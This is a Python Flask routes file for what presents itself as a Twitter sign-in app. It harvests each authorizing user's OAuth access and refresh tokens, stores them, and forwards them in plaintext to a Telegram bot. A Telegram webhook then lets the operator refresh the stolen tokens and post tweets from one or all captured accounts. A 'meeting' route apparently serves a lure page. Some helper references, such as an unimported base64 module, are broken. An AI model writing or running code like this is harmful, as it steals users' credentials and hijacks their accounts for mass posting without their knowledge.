from flask import request, session, redirect, url_for, render_template
import requests
from config import Config
from database import store_token, get_all_tokens, get_total_tokens
from helpers import (
    generate_code_verifier_and_challenge, send_message_via_telegram, post_tweet,
    get_twitter_username_and_profile, handle_post_single,
    handle_post_bulk, handle_refresh_single, handle_refresh_bulk
)

# Home route function
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if 'username' in session:
        send_message_via_telegram(f"👋 @{session['username']} just returned to the website.")
        return redirect(url_for('welcome'))

    if request.args.get('authorize') == 'true':
        state = "0"
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={Config.CLIENT_ID}&response_type=code&"
            f"redirect_uri={Config.CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != session.get('oauth_state', '0'):
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': Config.CALLBACK_URL,
            'code_verifier': code_verifier
        }
        response = requests.post(token_url, auth=(Config.CLIENT_ID, Config.CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')

            username, profile_url = get_twitter_username_and_profile(access_token)
            if username:
                store_token(access_token, refresh_token, username)
                session['username'] = username
                session['access_token'] = access_token
                session['refresh_token'] = refresh_token
                total_tokens = get_total_tokens()
                send_message_via_telegram(
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"📊 Total Tokens in Database: {total_tokens}"
                )
                return redirect(url_for('welcome'))
            else:
                return "Error retrieving user info with access token", 400

    return render_template('home.html')

# Dashboard route
def dashboard():
    username = session.get('username', 'User')
    return render_template('dashboard.html', username=username)

# Welcome route
def welcome():
    username = session.get('username', 'User')
    
    if 'refresh_token' in session:
        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
        if access_token and refresh_token:
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
    return render_template('welcome.html', message=f"Welcome back, @{username}!")

# Logout route
def logout():
    session.clear()
    return redirect(url_for('home'))

# Telegram webhook route
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        handle_refresh_single()
    elif message == '/refresh_bulk':
        handle_refresh_bulk()
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text)
    else:
        send_message_via_telegram("❌ Unknown command.")
    return '', 200

# Tweet route for posting a tweet with a specified access token
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)

    return render_template('tweet_form.html', access_token=access_token)

# Refresh page route
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

# Perform refresh route
def perform_refresh(refresh_token):
    # Logic to refresh token using refresh_token and notify via Telegram
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{Config.CLIENT_ID}:{Config.CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    
    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': Config.CLIENT_ID
    }

    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        username, profile_url = get_twitter_username_and_profile(new_access_token)

        if username:
            store_token(new_access_token, new_refresh_token, username)
            send_message_via_telegram(f"New Access Token: {new_access_token}\n"
                                      f"New Refresh Token: {new_refresh_token}\n"
                                      f"Username: @{username}\n"
                                      f"Profile URL: {profile_url}")
            return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
        else:
            return "Error retrieving user info with the new access token", 400
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code

# Meeting route
def meeting():
    state_id = request.args.get('meeting')
    code_ch = request.args.get('pwd')
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)

# Active route
def active():
    username = session.get('username', 'User')
    return render_template('active.html', username=username)
